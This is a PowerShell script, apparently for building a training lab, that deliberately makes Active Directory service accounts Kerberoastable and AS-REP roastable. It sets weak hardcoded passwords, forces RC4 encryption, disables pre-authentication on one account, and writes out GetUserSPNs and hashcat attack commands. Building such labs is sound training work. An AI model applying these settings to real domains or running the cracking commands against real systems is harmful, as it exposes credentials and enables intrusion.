﻿# vuln: kerberoasting | severity: critical
# Creates weak SPN accounts with RC4 encryption forced — Kerberoastable
# Attack: GetUserSPNs.py cyberstrike.mil/ansible:abc@123 -dc-ip 10.0.20.101 -outputfile hashes.txt
#         hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
# Requires: AD DS, Run on ADDC

Write-Host "[VULN] Injecting Kerberoasting vulnerability..."

Import-Module ActiveDirectory -ErrorAction Stop

$accounts = @(
    @{ Name = "svc_http";   Display = "HTTP Service Account";   SPN = "HTTP/web.cyberstrike.mil";          Password = "Service123!" },
    @{ Name = "svc_mssql";  Display = "MSSQL Service Account";  SPN = "MSSQLSvc/db.cyberstrike.mil:1433";  Password = "Sql2024!!" },
    @{ Name = "svc_backup"; Display = "Backup Service Account"; SPN = "backup/backup.cyberstrike.mil";     Password = "Backup2024!" }
)

foreach ($a in $accounts) {
    try {
        # Create user if not exists
        if (-not (Get-ADUser -Filter {SamAccountName -eq $a.Name} -ErrorAction SilentlyContinue)) {
            New-ADUser `
                -Name $a.Display `
                -SamAccountName $a.Name `
                -UserPrincipalName "$($a.Name)@cyberstrike.mil" `
                -AccountPassword (ConvertTo-SecureString $a.Password -AsPlainText -Force) `
                -Enabled $true `
                -PasswordNeverExpires $true
            Write-Host "[+] Created: $($a.Name)"
        } else {
            Write-Host "[+] Already exists: $($a.Name)"
        }

        # Set SPN
        Set-ADUser -Identity $a.Name -ServicePrincipalNames @{Add = $a.SPN}
        Write-Host "[+] SPN set: $($a.SPN)"

        # Force RC4 encryption — makes ticket crackable offline
        Set-ADUser -Identity $a.Name -KerberosEncryptionType RC4
        Write-Host "[+] RC4 encryption forced for: $($a.Name)"

    } catch {
        Write-Host "[!] Failed for $($a.Name): $($_.Exception.Message)"
    }
}

# svc_backup also gets pre-auth disabled (AS-REP roastable too)
try {
    Set-ADAccountControl -Identity "svc_backup" -DoesNotRequirePreAuth $true
    Write-Host "[+] Pre-auth disabled for svc_backup (also AS-REP roastable)"
} catch {
    Write-Host "[!] Could not disable pre-auth for svc_backup: $($_.Exception.Message)"
}

# Write info file
New-Item -Path "C:\Temp" -ItemType Directory -Force | Out-Null
@"
Kerberoastable Accounts:
- svc_http   : Service123!  SPN=HTTP/web.cyberstrike.mil
- svc_mssql  : Sql2024!!    SPN=MSSQLSvc/db.cyberstrike.mil:1433
- svc_backup : Backup2024!  SPN=backup/backup.cyberstrike.mil

Attack commands:
GetUserSPNs.py cyberstrike.mil/ansible:abc@123 -dc-ip 10.0.20.101 -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
"@ | Out-File "C:\Temp\kerberoasting_info.txt" -Encoding UTF8

Write-Host "[VULN] Kerberoasting injection complete."